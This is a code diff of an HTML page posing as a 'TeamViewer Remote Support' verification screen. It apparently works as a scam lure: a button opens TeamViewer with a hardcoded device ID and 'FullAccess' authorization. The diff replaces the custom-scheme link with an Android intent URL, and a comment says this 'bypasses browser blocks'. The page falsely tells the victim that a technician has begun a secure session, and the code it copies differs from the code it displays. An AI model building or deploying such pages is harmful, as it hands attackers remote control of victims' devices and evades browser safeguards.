@@ -15,30 +15,19 @@
             min-height: 100vh;
         }
         .card {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
-            width: 90%;
-            max-width: 400px;
-            padding: 32px 24px;
-            text-align: center;
+            background: white; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+            width: 90%; max-width: 400px; padding: 32px 24px; text-align: center;
         }
         .logo {
-            width: 48px; height: 48px;
-            background: #0E8ED5;
-            border-radius: 12px;
-            margin: 0 auto 20px;
-            display: flex; align-items: center; justify-content: center;
+            width: 48px; height: 48px; background: #0E8ED5; border-radius: 12px;
+            margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;
         }
         .logo svg { width: 28px; height: 28px; fill: white; }
         h1 { font-size: 20px; font-weight: 600; color: #111; margin-bottom: 8px; }
         .subtitle { font-size: 14px; color: #555; margin-bottom: 24px; line-height: 1.5; }
         .code-box {
-            background: #f5f7fa;
-            border: 1px dashed #bac8d9;
-            border-radius: 8px;
-            padding: 16px;
-            margin-bottom: 20px;
+            background: #f5f7fa; border: 1px dashed #bac8d9; border-radius: 8px;
+            padding: 16px; margin-bottom: 20px;
         }
         .code-label {
             font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; color: #777; margin-bottom: 6px;
@@ -47,19 +36,9 @@
             font-size: 28px; font-weight: 700; color: #0E8ED5; letter-spacing: 2px;
         }
         .button {
-            background: #0E8ED5;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 14px 0;
-            font-size: 16px;
-            font-weight: 600;
-            width: 100%;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: block;
-            text-decoration: none;
-            margin-top: 10px;
+            background: #0E8ED5; color: white; border: none; border-radius: 8px;
+            padding: 14px 0; font-size: 16px; font-weight: 600; width: 100%;
+            cursor: pointer; margin-top: 10px; display: block; text-decoration: none;
         }
         .button:hover { background: #0b7ab8; }
         .footer { font-size: 11px; color: #999; margin-top: 20px; }
@@ -68,21 +47,20 @@
 <body>
     <div class="card">
         <div class="logo">
-            <svg viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-            </svg>
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
         </div>
         <h1>TeamViewer Remote Support</h1>
         <p class="subtitle">
             Your technician has started a secure session.<br>
-            Tap the button below to copy the code and open the app.
+            Tap the button to copy the code and open the app.
         </p>
         <div class="code-box">
             <div class="code-label">Verification Code</div>
-            <div class="code-value" id="code">n79ktdgt</div>
+            <div class="code-value">qrntf9qd</div>
         </div>
-        <!-- Button triggers the deep link directly on click, after clipboard write -->
-        <a class="button" id="connectBtn" href="tvcontrol1://control?device=791826887&authorization=FullAccess">
+        <!-- Intent URL bypasses browser blocks on custom schemes -->
+        <a class="button" id="connectBtn"
+           href="intent://control?device=791826887&authorization=FullAccess#Intent;scheme=tvcontrol1;package=com.teamviewer.teamviewer.market.mobile;end;">
             Copy Code &amp; Open TeamViewer
         </a>
         <p class="footer">
@@ -92,19 +70,12 @@
     </div>
 
     <script>
-        const code = document.getElementById('code').textContent;
-        const btn = document.getElementById('connectBtn');
-
-        btn.addEventListener('click', async function(e) {
-            // Copy code to clipboard on click
+        const code = "123456";
+        document.getElementById('connectBtn').addEventListener('click', async function(e) {
             try {
                 await navigator.clipboard.writeText(code);
-                console.log('Code copied.');
-            } catch (err) {
-                console.warn('Clipboard copy failed, but the app will open.');
-            }
-            // The deep link is already in the href – the browser will follow it.
-            // No return false, allow the link to execute.
+            } catch (err) { }
+            // The href will open the app after the click
         });
     </script>
 </body>
